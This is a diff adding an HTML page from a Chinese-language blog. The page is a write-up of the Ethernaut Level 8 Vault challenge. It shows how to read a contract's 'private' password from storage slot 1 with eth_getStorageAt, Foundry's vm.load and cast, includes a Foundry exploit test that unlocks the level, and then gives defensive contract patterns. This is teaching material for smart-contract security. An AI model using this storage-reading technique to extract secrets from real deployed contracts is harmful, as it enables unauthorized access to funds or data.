@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          Ethernaut Level 8: Vault - 私有变量读取 - Kent&#39;s Blog
+        
+    </title>
+
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>KENT&#39;S BLOG</span>
+  </a>
+</div>
+    <div id="menu" class="book-menu hide">
+  <h2 id="主要内容"><a href="#主要内容" class="headerlink" title="主要内容"></a>主要内容</h2><ul>
+<li><a href="/">首页</a></li>
+<li><a href="/archives">文章归档</a></li>
+<li><a href="/categories">分类浏览</a> </li>
+<li><a href="/tags">标签云</a></li>
+</ul>
+<h2 id="Web3-0-专区"><a href="#Web3-0-专区" class="headerlink" title="Web3.0 专区"></a>Web3.0 专区</h2><ul>
+<li><a href="/categories/Dapp">Dapp 开发</a></li>
+<li><a href="/tags/solidity">智能合约</a></li>
+<li><a href="/tags/blockchain">区块链技术</a></li>
+<li><a href="/categories/Web3%E5%AE%89%E5%85%A8">Web3安全</a></li>
+</ul>
+<h2 id="Ethernaut-系列-🛡️"><a href="#Ethernaut-系列-🛡️" class="headerlink" title="Ethernaut 系列 🛡️"></a>Ethernaut 系列 🛡️</h2><ul>
+<li><a href="/2025/01/25/ethernaut-foundry-solutions-series/">系列总览</a></li>
+<li><a href="/2025/01/25/foundry-setup-guide/">Foundry 环境搭建</a></li>
+</ul>
+<h3 id="基础攻击篇-1-10"><a href="#基础攻击篇-1-10" class="headerlink" title="基础攻击篇 (1-10)"></a>基础攻击篇 (1-10)</h3><ul>
+<li><a href="/2025/01/25/ethernaut-level-01-fallback/">Level 1: Fallback</a></li>
+<li><a href="/2025/01/25/ethernaut-level-02-fallout/">Level 2: Fallout</a></li>
+<li><a href="/2025/01/25/ethernaut-level-03-coinflip/">Level 3: Coin Flip</a></li>
+<li><a href="/2025/01/25/ethernaut-level-04-telephone/">Level 4: Telephone</a></li>
+<li><a href="/2025/01/25/ethernaut-level-05-token/">Level 5: Token</a></li>
+<li><a href="/2025/01/25/ethernaut-level-06-delegation/">Level 6: Delegation</a></li>
+<li><a href="/2025/01/25/ethernaut-level-07-force/">Level 7: Force</a></li>
+<li><a href="/2025/01/25/ethernaut-level-08-vault/">Level 8: Vault</a></li>
+<li><a href="/2025/01/25/ethernaut-level-09-king/">Level 9: King</a></li>
+<li><a href="/2025/01/25/ethernaut-level-10-reentrancy/">Level 10: Re-entrancy</a></li>
+</ul>
+<h3 id="进阶攻击篇-11-20"><a href="#进阶攻击篇-11-20" class="headerlink" title="进阶攻击篇 (11-20)"></a>进阶攻击篇 (11-20)</h3><ul>
+<li><a href="/2025/01/25/ethernaut-level-11-elevator/">Level 11: Elevator</a></li>
+<li><a href="/2025/01/25/ethernaut-level-12-privacy/">Level 12: Privacy</a></li>
+<li><a href="/2025/01/25/ethernaut-level-13-gatekeeper-one/">Level 13: Gatekeeper One</a></li>
+<li><a href="/2025/01/25/ethernaut-level-14-gatekeeper-two/">Level 14: Gatekeeper Two</a></li>
+<li><a href="/2025/01/25/ethernaut-level-15-naught-coin/">Level 15: Naught Coin</a></li>
+<li><a href="/2025/01/25/ethernaut-level-16-preservation/">Level 16: Preservation</a></li>
+<li><a href="/2025/01/25/ethernaut-level-17-recovery/">Level 17: Recovery</a></li>
+<li><a href="/2025/01/25/ethernaut-level-18-magic-number/">Level 18: Magic Number</a></li>
+<li><a href="/2025/01/25/ethernaut-level-19-alien-codex/">Level 19: Alien Codex</a></li>
+<li><a href="/2025/01/25/ethernaut-level-20-denial/">Level 20: Denial</a></li>
+</ul>
+<h3 id="高级攻击篇-21-25"><a href="#高级攻击篇-21-25" class="headerlink" title="高级攻击篇 (21-25)"></a>高级攻击篇 (21-25)</h3><ul>
+<li><a href="/2025/01/25/ethernaut-level-21-shop/">Level 21: Shop</a></li>
+<li><a href="/2025/01/25/ethernaut-level-22-dex/">Level 22: Dex</a></li>
+<li><a href="/2025/01/25/ethernaut-level-23-dex-two/">Level 23: Dex Two</a></li>
+<li><a href="/2025/01/25/ethernaut-level-24-puzzle-wallet/">Level 24: Puzzle Wallet</a></li>
+<li><a href="/2025/01/25/ethernaut-level-25-motorbike/">Level 25: Motorbike</a></li>
+</ul>
+<h2 id="个人页面"><a href="#个人页面" class="headerlink" title="个人页面"></a>个人页面</h2><ul>
+<li><a href="/about">关于我</a></li>
+<li><a href="/repository">项目展示</a></li>
+<li><a href="/books">书单推荐</a></li>
+<li><a href="/links">友情链接</a></li>
+</ul>
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
+  <div class="sidebar-toggle-inner"></div>
+</div>
+
+<script>
+function add_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.add('show')  
+}
+
+function remove_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.remove('show')
+}
+
+function sidebar_toggle() {
+    let sidebar_toggle = document.querySelector('.sidebar-toggle')
+    let sidebar = document.querySelector('.book-sidebar')
+    let content = document.querySelector('.off-canvas-content')
+    if (sidebar_toggle.classList.contains('extend')) { // show
+        sidebar_toggle.classList.remove('extend')
+        sidebar.classList.remove('hide')
+        content.classList.remove('extend')
+    }
+    else { // hide
+        sidebar_toggle.classList.add('extend')
+        sidebar.classList.add('hide')
+        content.classList.add('extend')
+    }
+}
+</script>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <h1 id="🎯-Ethernaut-Level-8-Vault-私有变量读取"><a href="#🎯-Ethernaut-Level-8-Vault-私有变量读取" class="headerlink" title="🎯 Ethernaut Level 8: Vault - 私有变量读取"></a>🎯 Ethernaut Level 8: Vault - 私有变量读取</h1><blockquote>
+<p><strong>关卡链接</strong>: <a target="_blank" rel="noopener" href="https://ethernaut.openzeppelin.com/level/8">Ethernaut Level 8 - Vault</a><br><strong>攻击类型</strong>: 私有变量读取<br><strong>难度</strong>: ⭐⭐⭐☆☆</p>
+</blockquote>
+<h2 id="📋-挑战目标"><a href="#📋-挑战目标" class="headerlink" title="📋 挑战目标"></a>📋 挑战目标</h2><p>要 unlock 这个合约账户，也就是要找到 password。挑战的关键在于理解区块链上没有真正的”私有”数据，所有状态变量都可以被读取。</p>
+<p><img src="https://ethernaut.openzeppelin.com/imgs/BigLevel8.svg" alt="Vault Requirements"></p>
+<h2 id="🔍-漏洞分析"><a href="#🔍-漏洞分析" class="headerlink" title="🔍 漏洞分析"></a>🔍 漏洞分析</h2><h3 id="存储机制-Storage"><a href="#存储机制-Storage" class="headerlink" title="存储机制 (Storage)"></a>存储机制 (Storage)</h3><p>我们需要理解 EVM 中存储的布局以及原理（使用 32 字节大小的插槽）和 JSON RPC 函数 <code>eth_getStorageAt</code>。</p>
+<p>EVM 的数据都存在 32 字节槽中：</p>
+<ul>
+<li>第一个状态变量存储在槽位 0</li>
+<li>如果第一个变量存储完了还有足够的字节，下一个变量也存储在 slot 0</li>
+<li>否则存储在 slot 1，依此类推</li>
+</ul>
+<blockquote>
+<p><strong>注意</strong>: 像数组和字符串这样的动态类型工作方式不同</p>
+</blockquote>
+<p>在 Vault 合约中：</p>
+<ul>
+<li><code>locked</code> 是一个布尔值，使用 1 字节，存储在 slot 0</li>
+<li><code>password</code> 是一个 bytes32，使用 32 个字节</li>
+<li>由于插槽 0 中剩余的 31 个字节无法容纳 password，因此它被存储在 slot 1 中</li>
+</ul>
+<h3 id="读取-Storage"><a href="#读取-Storage" class="headerlink" title="读取 Storage"></a>读取 Storage</h3><p><code>eth_getStorageAt</code> JSON RPC 函数可用于读取合约在给定槽位的存储。</p>
+<p>使用 web3.js 读取 slot 1 的合约存储：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(contractAddress, <span class="number">1</span>, <span class="function">(<span class="params">err, result</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>在 Foundry 中，可以使用 cheatcodes 中的 load：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bytes32 password = vm.load(address(instance), bytes32(uint256(1)));</span><br></pre></td></tr></table></figure>
+
+<h2 id="💻-Foundry-实现"><a href="#💻-Foundry-实现" class="headerlink" title="💻 Foundry 实现"></a>💻 Foundry 实现</h2><h3 id="攻击合约代码"><a href="#攻击合约代码" class="headerlink" title="攻击合约代码"></a>攻击合约代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;../src/Ethernaut.sol&quot;;</span><br><span class="line">import &quot;../src/levels/VaultFactory.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract VaultTest is Test &#123;</span><br><span class="line">    Ethernaut ethernaut;</span><br><span class="line">    VaultFactory vaultFactory;</span><br><span class="line">    </span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        ethernaut = new Ethernaut();</span><br><span class="line">        vaultFactory = new VaultFactory();</span><br><span class="line">        ethernaut.registerLevel(vaultFactory);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function testVaultExploit() public &#123;</span><br><span class="line">        // 创建关卡实例</span><br><span class="line">        address levelInstance = ethernaut.createLevelInstance(vaultFactory);</span><br><span class="line">        Vault instance = Vault(levelInstance);</span><br><span class="line">        </span><br><span class="line">        // 验证初始状态</span><br><span class="line">        assertEq(instance.locked(), true);</span><br><span class="line">        </span><br><span class="line">        // 攻击：读取存储在 slot 1 中的密码</span><br><span class="line">        bytes32 password = vm.load(address(instance), bytes32(uint256(1)));</span><br><span class="line">        </span><br><span class="line">        // 使用读取的密码解锁</span><br><span class="line">        instance.unlock(password);</span><br><span class="line">        </span><br><span class="line">        // 验证攻击成功</span><br><span class="line">        assertEq(instance.locked(), false);</span><br><span class="line">        </span><br><span class="line">        // 提交关卡</span><br><span class="line">        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(</span><br><span class="line">            payable(levelInstance)</span><br><span class="line">        );</span><br><span class="line">        assert(levelSuccessfullyPassed);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="关键攻击步骤"><a href="#关键攻击步骤" class="headerlink" title="关键攻击步骤"></a>关键攻击步骤</h3><ol>
+<li><strong>分析存储布局</strong>：确定 password 存储在 slot 1</li>
+<li><strong>读取存储</strong>：使用 <code>vm.load()</code> 读取 slot 1 的数据</li>
+<li><strong>调用 unlock</strong>：使用读取的密码解锁合约</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 读取 slot 1 中的密码</span><br><span class="line">bytes32 password = vm.load(address(instance), bytes32(uint256(1)));</span><br><span class="line"></span><br><span class="line">// 解锁合约</span><br><span class="line">instance.unlock(password);</span><br><span class="line"></span><br><span class="line">// 验证解锁成功</span><br><span class="line">assertEq(instance.locked(), false);</span><br></pre></td></tr></table></figure>
+
+<h2 id="🛡️-防御措施"><a href="#🛡️-防御措施" class="headerlink" title="🛡️ 防御措施"></a>🛡️ 防御措施</h2><h3 id="1-避免在链上存储敏感数据"><a href="#1-避免在链上存储敏感数据" class="headerlink" title="1. 避免在链上存储敏感数据"></a>1. 避免在链上存储敏感数据</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// ❌ 不安全：密码存储在链上</span><br><span class="line">contract VulnerableVault &#123;</span><br><span class="line">    bytes32 private password;  // 可以被读取！</span><br><span class="line">    </span><br><span class="line">    constructor(bytes32 _password) &#123;</span><br><span class="line">        password = _password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// ✅ 安全：使用哈希验证</span><br><span class="line">contract SecureVault &#123;</span><br><span class="line">    bytes32 private passwordHash;  // 存储哈希而不是明文</span><br><span class="line">    </span><br><span class="line">    constructor(bytes32 _passwordHash) &#123;</span><br><span class="line">        passwordHash = _passwordHash;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function unlock(string memory _password) public &#123;</span><br><span class="line">        require(keccak256(abi.encodePacked(_password)) == passwordHash, &quot;Wrong password&quot;);</span><br><span class="line">        // unlock logic</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-使用提交-揭示方案"><a href="#2-使用提交-揭示方案" class="headerlink" title="2. 使用提交-揭示方案"></a>2. 使用提交-揭示方案</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">contract CommitRevealVault &#123;</span><br><span class="line">    mapping(address =&gt; bytes32) private commitments;</span><br><span class="line">    </span><br><span class="line">    // 第一阶段：提交哈希</span><br><span class="line">    function commit(bytes32 _commitment) public &#123;</span><br><span class="line">        commitments[msg.sender] = _commitment;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 第二阶段：揭示并验证</span><br><span class="line">    function reveal(string memory _password, uint256 _nonce) public &#123;</span><br><span class="line">        bytes32 hash = keccak256(abi.encodePacked(_password, _nonce));</span><br><span class="line">        require(commitments[msg.sender] == hash, &quot;Invalid reveal&quot;);</span><br><span class="line">        // unlock logic</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-使用链下验证"><a href="#3-使用链下验证" class="headerlink" title="3. 使用链下验证"></a>3. 使用链下验证</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">contract OffChainVault &#123;</span><br><span class="line">    address private authorizedSigner;</span><br><span class="line">    mapping(address =&gt; bool) private unlocked;</span><br><span class="line">    </span><br><span class="line">    function unlock(bytes memory signature, address user) public &#123;</span><br><span class="line">        bytes32 messageHash = keccak256(abi.encodePacked(user, &quot;unlock&quot;));</span><br><span class="line">        address signer = recoverSigner(messageHash, signature);</span><br><span class="line">        require(signer == authorizedSigner, &quot;Unauthorized&quot;);</span><br><span class="line">        unlocked[user] = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="🔧-相关工具和技术"><a href="#🔧-相关工具和技术" class="headerlink" title="🔧 相关工具和技术"></a>🔧 相关工具和技术</h2><h3 id="存储读取工具"><a href="#存储读取工具" class="headerlink" title="存储读取工具"></a>存储读取工具</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 cast 读取存储</span></span><br><span class="line">cast storage &lt;CONTRACT_ADDRESS&gt; &lt;SLOT_NUMBER&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 web3.py</span></span><br><span class="line">from web3 import Web3</span><br><span class="line">w3 = Web3(Web3.HTTPProvider(<span class="string">&#x27;http://localhost:8545&#x27;</span>))</span><br><span class="line">password = w3.eth.get_storage_at(contract_address, 1)</span><br></pre></td></tr></table></figure>
+
+<h3 id="存储布局分析"><a href="#存储布局分析" class="headerlink" title="存储布局分析"></a>存储布局分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 使用 forge inspect 查看存储布局</span><br><span class="line">// forge inspect &lt;CONTRACT&gt; storage-layout</span><br></pre></td></tr></table></figure>
+
+<h2 id="🎯-总结"><a href="#🎯-总结" class="headerlink" title="🎯 总结"></a>🎯 总结</h2><p><strong>核心概念</strong>:</p>
+<ul>
+<li><code>private</code> 关键字意味着数据只能由合约本身访问，而不是对外界隐藏</li>
+<li>区块链上没有什么是私有的，一切都是公开的，任何人都可以阅读</li>
+<li>EVM 存储使用 32 字节的插槽系统</li>
+</ul>
+<p><strong>攻击向量</strong>:</p>
+<ul>
+<li>直接读取合约存储</li>
+<li>分析存储布局确定敏感数据位置</li>
+<li>使用 RPC 调用或 Foundry cheatcodes 读取数据</li>
+</ul>
+<p><strong>防御策略</strong>:</p>
+<ul>
+<li>永远不要在链上存储明文敏感数据</li>
+<li>使用哈希和承诺方案</li>
+<li>考虑链下验证机制</li>
+<li>实施适当的访问控制</li>
+</ul>
+<hr>
+<h2 id="🔗-相关链接"><a href="#🔗-相关链接" class="headerlink" title="🔗 相关链接"></a>🔗 相关链接</h2><ul>
+<li><strong><a href="/2025/01/25/ethernaut-foundry-solutions-series/">系列目录: Ethernaut Foundry Solutions</a></strong></li>
+<li><strong><a href="/2025/01/25/ethernaut-level-07-force/">上一关: Level 7 - Force</a></strong></li>
+<li><strong><a href="/2025/01/25/ethernaut-level-09-king/">下一关: Level 9 - King</a></strong></li>
+<li><strong><a target="_blank" rel="noopener" href="https://github.com/XuHugo/Ethernaut-Foundry-Solutions">GitHub 项目</a></strong></li>
+</ul>
+
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure
+          class="avatar avatar-lg"
+          data-initial="K"
+          style="background-color: #3b4351;">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>Kent</div>
+      <div>2025-01-25</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/Web3%E5%AE%89%E5%85%A8/">Web3安全</a> <a class="category-link" href="/categories/Web3%E5%AE%89%E5%85%A8/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/">智能合约</a> <a class="category-link" href="/categories/Web3%E5%AE%89%E5%85%A8/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/Ethernaut/">Ethernaut</a>
+
+      <a class="tag-none-link" href="/tags/Ethernaut/" rel="tag">#Ethernaut</a> <a class="tag-none-link" href="/tags/Foundry/" rel="tag">#Foundry</a> <a class="tag-none-link" href="/tags/Solidity/" rel="tag">#Solidity</a> <a class="tag-none-link" href="/tags/Storage/" rel="tag">#Storage</a> <a class="tag-none-link" href="/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8/" rel="tag">#智能合约安全</a> <a class="tag-none-link" href="/tags/%E7%A7%81%E6%9C%89%E5%8F%98%E9%87%8F%E8%AF%BB%E5%8F%96/" rel="tag">#私有变量读取</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
